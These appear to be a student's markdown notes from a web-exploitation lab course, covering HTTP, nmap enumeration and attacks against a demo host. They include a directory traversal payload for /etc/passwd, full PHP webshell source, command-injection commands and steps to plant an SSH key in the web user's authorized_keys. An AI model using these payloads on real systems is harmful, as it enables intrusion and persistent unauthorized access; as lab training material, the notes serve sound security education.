- Demo Web Exploit Float IP: 10.50.34.125

# HTTP

###### Types
Two types:
1. Request 	(client)
2. Reply 	(server)

##### HTTP Methods

- GET 		:	*requesting or retrieving data*
- HEAD 
- POST 		:	*sending information i.e. login credentials*

*Example:*
GET / HTTP/1.1
- GET = HTTP Method to Request/Retrieve
- / = www.google.com/
- HTTP/1.1 = HTTP Version being used

##### HTTP Status Codes

[list of codes](https://tools.ietf.org/html/rfc2616)

- 1xx = Informational Response
- 2xx = Successful
- 3xx = Redirection
- 4xx = Client Error
- 5xx = Server Error

### HTTP Developer Console

1. Open a web page in firefox
2. Right click -> `view page source`
3. press `f12`
 
#### Console Tab

`document.location;`
`document.cookie;`
`function();`		*can run existing functions on the website*
<script>
function myFunction() {
document.getElementById("demo").innerHTML = "Paragraph changed.";} </script>
#### Network Tab

##### GET methods
- Headers	:	Shows information about nature of client-server relationship
- User Agent	:	Gives user-agent information, useful for forensics

right click -> `copy as cURL`	:	shows CLI syntax for sending that specific GET request
- example: `curl 'https://quotes.toscrape.com/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: https://www.google.com/' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: cross-site'`

# WGET & CURL

#### WGET 
`wget -r -l2 -P /tmp ftp://ftpserver/`

^	`-r` recurisve, `-l2` 2 layers deep, `-P /tmp` saves to tmp directory
- Don't rely on using WGET as a crutch

#### CURL 
`curl -o example.html http://www.reddit.com`

# JAVASCRIPT

- JavaScript runs on the client's machine
- Coded as `.js` files or in line with html

 ## JavaScript interactive

- below reference formatting will suck in `.md` format

```java
<script>
function changeText() {
  x = document.getElementById("mySelect");
  x.options[x.selectedIndex].text = "Melon";
}
Select your favorite fruit:
<select id="mySelect">
  <option>Apple</option>
  <option>Orange</option>
  <option>Pineapple</option>
  <option>Banana</option>
<input type="button" onclick="changeText()" value="Set text of selected option">`
```
# WEB ENUMERATION STEPS
	
- The goal of web enumeration is to find out the existing webpages and webdirectories
	
1. Host Discovery (ping sweep)
2. Host Enumeration (port scan)
	`nmap -Pn -T5 x.x.x.x -p-`
	
3. Service enumeration (-sV|banner.nse)
	`nmap -Pn -T5 x.x.x.x -sV -p <ports>`
	`nmap -Pn -T5 x.x.x.x --script=banner.nse -p <ports>`
	
4. Web Enumeration
	`nmap -Pn -T5 -sT -p 80 --script http-enum.nse x.x.x.x`
	`nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse x.x.x.x`
	`nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse x.x.x.x`
	
	^ robots.txt finds webpages you can navigate to outside of the normal means
	
	So what actually is the robots.txt file?
	- Robots.txt tells webcrawlers what **can** and **cannot** be indexed
	
Example: ((syntax will suck in .md format))
```
	User-agent: *
	Allow: /uploads
	Allow: /chat
	Allow: /cmdinjection
	Allow: /java
	Allow: /path
	Allow: /webexampe
	Disallow: /cross
	Disallow: /
``` 

	User-agent: Googlebot
	Disallow: /


	User-agent: Baiduspider
	Disallow: /
			
# 5. Web Exploitation

### a. Directory Traversal -  Information
	
http://10.50.34.125/path/pathdemo.php
	
../../../../../../../../../../../etc/passwd
- http://10.50.34.125/path/pathdemo.php?
- http://10.50.34.125/path/pathdemo.php?myfile
- http://10.50.34.125/path/pathdemo.php?myfile=
- http://10.50.34.125/path/pathdemo.php?myfile=../../../../../../../../../../../etc/passwd
- http://10.50.34.125/path/pathdemo.php?myfile=../../../../../../../../../../../etc/passwd&
- http://10.50.34.125/path/pathdemo.php?myfile=../../../../../../../../../../../etc/passwd&submit=File+look+up		##also works



	
	
#### directory traversal files to read:
		- /etc/passwd		:	user information ((look for login shells/bash shells!)
		- /etc/group		:	groups that users are in ((look for root|adm|sudo))
		- /etc/hosts		:	shows webservers, dns servers, internal networks, or labelled network information	
		- /etc/resolv.conf	:	shows internal IP networks we can scan for
		- /etc/networks		:	tbh not exactly sure but likely not a big deal
		

### b. Malicious File Upload (Webshell) - Information/Access

- Can you upload? Yes (.php)
- Are file extensions being sanitized? No
- Can you access the uploads directory? Yes
- demo site: http://10.50.34.125/uploads/webshell.php
- webshell.php:

```
<HTML><BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>
```

STEPS:
1. Go to 10.50.34.125
2. Upload webshell.php
3. Go back to 10.50.34.125/cmdinjection/cmdinjectdemo.php
4. try entering commands (must have a semicolon before command, i.e. `; whoami`

### c. SSH Keys - Access

ssh student@x.x.x.x
password

##### 1. Generating SSH KEYS

1. On whichever host you plan on logging in from, generate keys. (10.150.34.125)
	- `ssh-keygen -t rsa -b 4096`
	- Public key is found in /home/student/.ssh/id_rsa.pub

```ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCnyLyyhsXRBrjshi4WbMDMQ+nZuqH3nYnEMOUwqYPU6kyVDRq3+BBQ0yWrqF7OeP0WkGnkQq15MHTwqlZVcC3L/TuRhU8jq/ABErO/WK7HB0M3DAQ6bKBsTyunUKmD7g0I9TgFb0/WRk988Q91nbx129m+KaeXu9oh6pxdtIT4XxWHZMHVngEGe8qCs1OFSpTLYb0wpcDdGtaj88QbmoiU2zgMiGgidiGyab0vLX3hRoyaxPh3xtIcopnJamistVeFCCgz0GsAikvMDiGo1RsVOmOzTqNBrosSgMH8kSrQb47agAMdp8FIuLb7Bx6mInkipL3ZT+yHCs7BXME3E34v student@linux-opstation-0yyk```


##### 2. Determine the user on the webserver

`; whoami`

- resuslt: www-data


##### 3. Determine the user's home directory

`;cat /etc/passwd`

- `www-data:x:33:33:www-data:/var/www:/bin/bash`
- user			: www-data
- home directory	: /var/www
- login shell		: /bin/bash

##### 4. Determine if .ssh/ directory exists in the user's home directory; if not, create it

`;ls -la /var/www`


##### 5. Create .ssh/ directory

`;mkdir /var/www/.ssh`

##### 6. Validate the .ssh/ directory has been created

`;ls -la /var/www`

##### 7. Inject our key into the authorized_keys file

`;echo "" >> /var/www/.ssh/authorized_keys`

##### 8. Validate the public is inside the authroized_keys file

`; cat /var/www/.ssh/authorized_keys`

##### 9. Login from the workstation you generated the key from

`ssh www-data@10.50.34.125`

- Webservers default web directories:
```
http://10.50.34.125/ = /var/www/html
http://10.50.34.125/uploads = /var/www/html/uploads
```






#### c. Command injection - Information/Access
	

	
	
### NIKTO

nikto v -h 10.50.34.125



	
	

